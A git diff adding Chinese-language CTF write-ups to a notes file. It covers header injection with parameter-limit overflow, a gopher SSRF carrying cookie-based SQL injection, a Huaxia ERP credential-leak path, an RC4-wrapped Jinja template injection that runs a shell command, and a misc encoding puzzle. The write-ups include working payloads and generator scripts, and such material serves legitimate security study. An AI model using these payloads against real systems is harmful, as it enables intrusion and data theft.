@@ -9495,9 +9495,285 @@ with open('test.phar', 'wb') as file:  # 更改文件后缀
 
 ![img](CTF.assets/17156037985274.png)
 
-# Crypto
+## 攻防世界 ez_curl
+
+进来给出源码和附件
+
+```php
+<?php
+//highlight_file(__FILE__);
+$url = 'http://back-end:3000/flag?';
+// 获取POST输入
+$input = file_get_contents('php://input');
+// 将输入的内容 json_decode 并取出 headers 转为 数组
+$headers = (array)json_decode($input)->headers;
+var_dump($headers);
+for ($i = 0; $i < count($headers); $i++) {
+    var_dump($headers[$i]);
+    // : 分隔 key:value
+    $offset = stripos($headers[$i], ':');
+    $key = substr($headers[$i], 0, $offset);
+    echo 'key: ', $key;
+    $value = substr($headers[$i], $offset + 1);
+    echo 'value: ', $value;
+    // 只能 key 有admin 或者 value 有 true
+    if (stripos($key, 'admin') > -1 && stripos($value, 'true') > -1) {
+        die('try hard');
+    }
+}
 
 
+$params = (array)json_decode($input)->params;
+var_dump($params);
+$url .= http_build_query($params);
+// URL 最后带上 admin=false
+$url .= '&admin=false';
+var_dump($url);
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+// 设置 HTTP 头
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+// 设置 超时时间
+curl_setopt($ch, CURLOPT_TIMEOUT_MS, 5000);
+// 设置为 POST 请求
+curl_setopt($ch, CURLOPT_NOBODY, FALSE);
+$result = curl_exec($ch);
+curl_close($ch);
+echo $result;
+```
+
+`req.query`检查的是`GET`传参，`req.headers`检查的是HTTP报头，总的来说，GET传参不允许出现`admin=false`，HTTP报头需要带上`admin=true`字段
+
+```js
+const express = require('express');
+
+const app = express();
+
+const port = 3000;
+const flag = process.env.flag;
+
+app.get('/flag', (req, res) => {
+    if(!req.query.admin.includes('false') && req.headers.admin.includes('true')){
+        res.send(flag);
+    }else{
+        res.send('try hard');
+    }
+});
+
+app.listen({ port: port , host: '0.0.0.0'});
+```
+
+首先是需要绕过第一个`if`，这里传入`xx: xx\nadmin: true`，得到：
+
+```
+key：xx
+value：xx\nadmin: true
+```
+
+成功绕过`if`判断，并且解析掉`\n`，成功在头部带上`admin: true`
+
+接着是`$url .= '&admin=false';`，由于express的parameterLimit默认为1000，即参数最大限制为1000，写脚本请求加上1000个参数就能成功把拼接的`&admin=flase`挤掉
+
+POC 脚本
+
+```py
+import requests
+import json
+
+url = 'http://61.147.171.105:55422/'
+data = {
+    "headers": ["xx: xx\nadmin: true"],
+    "params": {"admin": "true"}
+}
+
+for i in range(1, 1002):
+    data['params']['x' + str(i)] = i
+
+print(json.dumps(data))
+```
+
+这里有一点要提一下，php会将`[]`解析为一个数组，`{}`解析为带有键值对的对象，如下：
+
+```php
+<?php
+$src = '{"headers": ["xx: xx\nadmin: true"], "params": {"admin": "true"}}';
+$decoded = json_decode($src);
+//var_dump($decoded);
+var_dump($decoded->headers);
+var_dump($decoded->params);
+
+// 输出
+E:\phpstudy\phpstudy\phpstudy_pro\WWW\test3.php:5:
+array(1) {
+  [0] =>
+  string(18) "xx: xx
+admin: true"
+}
+E:\phpstudy\phpstudy\phpstudy_pro\WWW\test3.php:6:
+class stdClass#2 (1) {
+  public $admin =>
+  string(4) "true"
+}
+```
+
+将结果放到 Burp Suite发送或者直接用python发送都可以：
+
+![image-20240514161421686](CTF.assets/image-20240514161421686.png)
+
+## 攻防世界 very_easy_sql
+
+进来可以看到一个输入框，查看源码可以看到`use.php`，跳转可以看到很明显的SSRF，输入`127.0.0.1`，成功包含输入框
+
+![image-20240514204707084](CTF.assets/image-20240514204707084.png)
+
+结合题目名为`easy_sql`，那么很明显就是`gopher`伪协议POST提交的SQL注入了，这里有一个坑点，就是本身注入点不在输入框，而是在Cookie这里，输入框这里是弱口令，账号密码都是`admin`
+
+POC脚本：`gopher://`POST payload 脚本生成
+
+```py
+import urllib.parse
+import base64
+
+host = "127.0.0.1:80"
+content = "uname=uname&passwd=passwd"
+content_length = len(content)
+payload = "admin') and extractvalue(1, concat(0x7e, (select substring(group_concat(flag),29,30) from flag)))#"
+# base64 encode之后是一个字节对象，需要str转换为 utf-8
+cookie = 'this_is_your_cookie={}'.format(str(base64.b64encode(payload.encode('utf-8')), 'utf-8'))
+print(cookie)
+
+test = \
+    """POST /index.php HTTP/1.1
+Host: {}
+User-Agent: curl/7.43.0
+Accept: */*
+Cookie: {}
+Content-Type: application/x-www-form-urlencoded
+Content-Length: {}
+
+{}
+    """.format(host, cookie, content_length, content)
+
+tmp = urllib.parse.quote(test)
+new = tmp.replace("%0A", "%0D%0A")
+result = urllib.parse.quote(new)
+print("gopher://" + host + "/_" + result)
+```
+
+## 攻防世界 ezbypass-cat
+
+> 考点：华夏 erp 账号密码泄露
+
+这题提供了一个新思路，在web渗透的过程中，在考虑中间件漏洞的同时，其实我们应该还要关注JS的模块文件，因为有些JS的模块文件本身也会存在漏洞
+
+点击进来看到一个输入框，输入`admin`和密码后，显示密码错误，判断`admin`用户存在，尝试了一波弱口令不行，SQL注入的话，其实看到这个输入框这么漂亮，感觉就不像SQL注入了
+
+![image-20240514213440157](CTF.assets/image-20240514213440157.png)
+
+这里查看源码，可以看到一个`sysLogin.js`的文件，直接点进去可以看到中文显示乱码
+
+![image-20240514213108600](CTF.assets/image-20240514213108600.png)
+
+我们可以在控制台窗口这里查看
+
+![image-20240514213130799](CTF.assets/image-20240514213130799.png)
+
+搜索华夏erp就能找到相关的账号密码泄露漏洞，直接访问`/user/getAllList;.ico`路径即可，这里可以直接看到用户名和密码，由于前端输入的密码会被 JS md5，这里直接用BP提交即可。
+
+![image-20240514213232321](CTF.assets/image-20240514213232321.png)
+
+拦截数据包再发送用户名和密码，会更新我们的Cookie，拿着这串新的Cookie再去做一个目录扫描（新思路：拿到一串Cookie之后，可以再做一处目录扫描，可能会出新东西）
+
+![image-20240514213608539](CTF.assets/image-20240514213608539.png)
+
+![image-20240514213711545](CTF.assets/image-20240514213711545.png)
+
+最后访问`flag.html`即可拿到`flag`
+
+![image-20240514213745515](CTF.assets/image-20240514213745515.png)
+
+## BUUOJ [CISCN2019 华东南赛区]Double Secret
+
+> 参考：葵花宝典 - 模板注入 -> 可用类查找
+
+进入后对靶机进行目录扫描，结果如下：
+
+```
+[23:44:42] 200 -    2KB - /console                                          
+[23:47:32] 200 -   17B  - /robots.txt                                        
+[23:47:37] 200 -   57B  - /secret
+```
+
+访问`/secret`页面结果如下，这里一开始没反应过来，以为没东西了（以后遇到这种什么都没有的页面就应该做一个参数爆破的）
+
+![image-20240515213525277](CTF.assets/image-20240515213525277.png)
+
+![image-20240515213642568](CTF.assets/image-20240515213642568.png)
+
+​	当`?secret`超过4位数后报错，结果如下：这里我能反应出一个RC4的加解密，但是给我密钥我也不会用，而且可以看到解密出来的内容是直接渲染到模板的；那么这里有一个模板注入漏洞
+
+![image-20240515213729360](CTF.assets/image-20240515213729360.png)
+
+网上的wp都附上这么一个脚本：这里Cyber也可以做到，但是输出的结果可能会有问题，最好不要用（
+
+```py
+import base64
+from urllib import parse
+
+
+def rc4_main(key="init_key", message="init_message"):  # 返回加密后得内容
+    s_box = rc4_init_sbox(key)
+    crypt = str(rc4_excrypt(message, s_box))
+    return crypt
+
+
+def rc4_init_sbox(key):
+    s_box = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
+        s_box[i], s_box[j] = s_box[j], s_box[i]
+    return s_box
+
+
+def rc4_excrypt(plain, box):
+    res = []
+    i = j = 0
+    for s in plain:
+        i = (i + 1) % 256
+        j = (j + box[i]) % 256
+        box[i], box[j] = box[j], box[i]
+        t = (box[i] + box[j]) % 256
+        k = box[t]
+        res.append(chr(ord(s) ^ k))
+    cipher = "".join(res)
+    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
+
+
+key = "HereIsTreasure"  # 此处为密文
+message = input("请输入明文:\n")
+enc_base64 = rc4_main(key, message)
+enc_init = str(base64.b64decode(enc_base64), 'utf-8')
+enc_url = parse.quote(enc_init)
+print("rc4加密后的url编码:" + enc_url)
+# print("rc4加密后的base64编码"+enc_base64)
+```
+
+输入`{{config}}`后的rc4加密后的url编码结果：
+
+![image-20240515213925856](CTF.assets/image-20240515213925856.png)
+
+![image-20240515213957114](CTF.assets/image-20240515213957114.png)
+
+那么这里其实是有一个常规的模板注入漏洞的，只要将payload做一个RC4编码即可，现在要做的是寻找可用的类并执行命令，这里可以参考葵花宝典中的 模板注入 查找可用类
+
+最后payload：
+
+```
+{{''.__class__.__mro__[2].__subclasses__()[226].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag.txt').read()")}}
+```
+
+另外这里尝试通过模板注入漏洞去对PING码做攻击，但是失败了。问题好像是出现在我的`machine_id`
 
 # Misc
 
@@ -9736,6 +10012,31 @@ for i in l:
 print(''.join(result))
 
 ```
+
+## 第三届 广东省大学生攻防大赛
+
+> 附件地址：链接：https://pan.baidu.com/s/1fpa3r9-ArvK97HGgMwHCuQ?pwd=7u66 
+> 		提取码：7u66
+
+附件是一个压缩包，这里有一个脑洞的地方，压缩包名是一个md5，破解这个md5就是压缩包的密码
+
+![image-20240515095633050](CTF.assets/image-20240515095633050.png)
+
+解压得到一张图片，结合后缀是png，010editer打开可以看到文件头不对，修复即可
+
+![image-20240515095850785](CTF.assets/image-20240515095850785.png)
+
+修复后得到一个二维码，扫码后得到一串名为花朵符号的字符
+
+![image-20240515103141280](CTF.assets/image-20240515103141280.png)
+
+```
+❀❁❀❇❀✼❀❂✿❆✿✽❁❀✿✾❂❅✿❄❂❉❀✿❂❆❀❃❀✿❂❆✿❀❁✾✻✿❁❁❀❁❂❊✻❂✿❈=
+```
+
+解码即可拿到flag：`https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=huaduo`
+
+![image-20240515103210653](CTF.assets/image-20240515103210653.png)
 
 
 
